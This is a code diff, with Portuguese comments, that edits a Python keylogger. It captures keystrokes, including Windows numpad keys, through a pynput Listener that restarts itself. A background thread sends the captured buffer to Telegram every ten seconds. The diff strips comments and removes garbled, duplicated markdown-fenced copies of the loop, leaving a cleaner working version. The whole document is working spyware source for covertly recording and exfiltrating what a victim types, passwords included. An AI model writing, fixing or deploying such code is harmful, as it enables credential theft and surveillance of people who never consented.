@@ -22,20 +22,15 @@ def send_to_telegram(text):
 def on_press(key):
     global buffer
     try:
-        # Tenta pegar o caractere normal primeiro
         buffer += key.char
     except AttributeError:
-        # Se cair aqui, é uma tecla especial ou teclado numérico
         vk = getattr(key, 'vk', None)
-        
-        # Mapeamento de Virtual Keys do Windows para Numpad e Símbolos
         numpad_map = {
             96: '0', 97: '1', 98: '2', 99: '3', 100: '4', 
             101: '5', 102: '6', 103: '7', 104: '8', 105: '9',
             110: '.', 109: '*', 107: '-', 111: '/', 108: ',',
             13: '[ENTER]' 
         }
-
         if vk in numpad_map:
             val = numpad_map[vk]
             if val == '[ENTER]':
@@ -43,8 +38,6 @@ def on_press(key):
                 buffer = ""
             else:
                 buffer += val
-        
-        # Teclas de controle normais
         elif key == Key.space:
             buffer += " "
         elif key == Key.enter:
@@ -69,50 +62,14 @@ def auto_send():
     while True:
         time.sleep(10) 
         if buffer:
-            send_to_telegram(buffer + " [AUTO-SEND]")```python
-buffer = ""
-
-# Inicia a thread de envio automático
-threading.Thread(target=auto_send, daemon=True).start()
-
-# Loop principal para manter o keylogger vivo
-while True:
-try:
-with Listener(on_press=on_press) as listener:
-listener.join()
-except Exception:
-time.sleep(10)
-``````python
-buffer = ""
-
-# Inicia a thread de envio automático
+            send_to_telegram(buffer + " [AUTO-SEND]")
+            buffer = ""
 
 threading.Thread(target=auto_send, daemon=True).start()
 
-# Loop principal para manter o keylogger vivo
-
 while True:
-try:
-with Listener(on_press=on_press) as listener:
-listener.join()
-except Exception:
-time.sleep(10)
-``````python
-def auto_send():
-global buffer
-while True:
-time.sleep(10)
-if buffer:
-send_to_telegram(buffer + " [AUTO-SEND]")
-buffer = ""
-
-# Inicia a thread de envio automático
-threading.Thread(target=auto_send, daemon=True).start()
-
-# Loop principal para manter o keylogger vivo
-while True:
-try:
-with Listener(on_press=on_press) as listener:
-listener.join()
-except Exception:
-time.sleep(10)
+    try:
+        with Listener(on_press=on_press) as listener:
+            listener.join()
+    except Exception:
+        time.sleep(10)
